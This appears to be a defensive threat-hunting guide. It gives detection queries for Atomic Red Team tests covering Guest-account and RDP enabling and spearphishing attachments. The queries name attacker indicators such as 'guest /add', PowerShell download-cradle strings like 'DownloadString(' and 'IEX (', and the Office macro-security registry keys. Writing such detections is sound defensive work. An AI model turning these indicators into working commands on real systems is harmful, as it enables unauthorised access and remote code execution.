## Initial Access

### T1078.001 Enable Guest account with RDP and Admin
Atomics: [T1078.001](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1078.001/T1078.001.md)

Detects enabling of Guest account, adding Guest account to groups, as well as changing of Deny/Allow of Terminal Server connections through Registry changes.

```
(SrcProcCmdLine ContainsCIS "net localgroup" AND SrcProcCmdLine ContainsCIS "guest /add") OR (SrcProcCmdLine ContainsCIS "net user" AND SrcProcCmdLine ContainsCIS "/active:yes") OR (RegistryKeyPath In Contains ("Terminal Server\AllowTSConnections","Terminal Server\DenyTSConnections") AND EventType In ("Registry Value Create","Registry Value Modified"))
```

### T1566.001 Spearphishing Attachment
Atomics: [T1566.001](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1566.001/T1566.001.md)

#### Test 1:
This test merely uses Powershell to download a maldoc, the below query will find CommandLine or CommandScript downloads using multiple cradle methods as documented here by [HarmJ0y](https://gist.github.com/HarmJ0y/bb48307ffa663256e239). The below query should only be used for hunting purposes and covers most unobfuscated powershell cradles.

```
(SrcProcCmdLine In Contains Anycase ("Net.WebClient","(iwr","DownloadString(","WinHttp.WinHttpRequest","IEX (","InternetExplorer.Application","Msxml2.XMLHTTP","MSXML2.ServerXMLHTTP") OR SrcProcCmdScript In Contains Anycase ("Net.WebClient","(iwr","DownloadString(","WinHttp.WinHttpRequest","IEX (","InternetExplorer.Application","Msxml2.XMLHTTP","MSXML2.ServerXMLHTTP"))
```


#### Test 2:
This execution of macro code using Invoke-MalDoc triggers S1 T1027 Evasion Indicator, so we could RegEx on IndicatorMetadata but that'd have noise.

The below query should only be used for threat hunting, but it will detect Macro security settings changes to the registry for Word and Excel as well as detecting COM objects within ComandLine and CommandScript indicator objects. There may be a lot of results, focus on Indicators and Command Scripts objects as they'll have less false positives.

```
(RegistryPath In Contains ("Word\Security\AccessVBOM","Excel\Security\AccessVBOM") AND EventType In ("Registry Value Create","Registry Value Modified")) OR (SrcProcCmdLine In Contains Anycase ("ActiveVBProject.VBComponents","Word.Application","Excel.Application") OR SrcProcCmdScript In Contains Anycase ("ActiveVBProject.VBComponents","Word.Application","Excel.Application"))
```